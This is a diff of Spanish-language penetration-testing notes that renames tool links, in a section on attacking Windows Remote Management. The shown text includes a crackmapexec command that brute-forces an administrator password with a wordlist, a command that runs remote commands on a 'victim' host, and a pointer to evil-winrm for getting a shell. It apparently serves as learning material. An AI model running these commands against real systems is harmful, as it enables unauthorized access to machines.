@@ -151,10 +151,10 @@ En caso de que use xfreerdp
 
 #### WINRM
 
-Usaremos la herramienta de [[00.- Herramientas/CRACKMAPEXEC]]
+Usaremos la herramienta de [[NETEXEC]]
 `crackmapexec winrm 10.2.18.45 -u administrator -p /usr/share/metasploit-framework/dat/wordlists/unix_passwords.txt`
 
-Nos muestra el usuario y la contraseña, para poder ejecutar comandos en el servicio usaremos de nuevo [[00.- Herramientas/CRACKMAPEXEC]]
+Nos muestra el usuario y la contraseña, para poder ejecutar comandos en el servicio usaremos de nuevo [[NETEXEC]]
 `crackmapexec winrm <IP_victinma> -u administrador -p <password> -x "<comando>"`
 
 Si queremos obtener una sesión con una shell usaremos EVIL-WINRM.RB
